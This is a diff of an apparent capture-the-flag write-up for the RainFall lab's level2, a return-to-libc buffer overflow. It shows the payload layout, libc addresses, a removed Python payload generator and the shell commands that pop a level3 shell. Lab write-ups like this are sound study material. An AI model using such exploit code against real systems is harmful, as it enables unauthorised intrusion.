@@ -62,14 +62,7 @@ $2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
 export SHELL=/bin/sh
 
 # We can get the address of the string, by using a small c program that prints
-# the wanted environment variable :
-
-#include <stdio.h>
-#include <string.h>
-void main(int argc, char **argv) {
-	if (argc == 2 && strcmp(argv[1], 'SHELL'))
-		printf('%p\n', getenv(argv[1]));
-}
+# the wanted environment variable (cf. ./Resources/get_shell.c).
 
 # Now that we have everything, let's build the payload.
 # As you may know, when calling a function, its argument list is expected 
@@ -81,13 +74,8 @@ void main(int argc, char **argv) {
 [ Address of exit() ] [ 0xb7e5ebe0 ]
 [ Address of '/bin/sh' ] [ 0xbffff90e ]
 
-# Finally, the result (every address is little endian, hence the import) :
-level2@RainFall:~$ python -c "import struct;
-ret = struct.pack('I', 0x804853e)
-system = struct.pack('I', 0xb7e6b060)
-exit = struct.pack('I', 0xb7e5ebe0)
-string = struct.pack('I', 0xbffff90e)
-print 'A' * 80 + ret + system + exit + string" > /tmp/payload
+# Finally, the result :
+level2@RainFall:~$ python /tmp/payload.py > /tmp/payload
 level2@RainFall:~$ cat /tmp/payload - | ./level2
 whoami
 level3
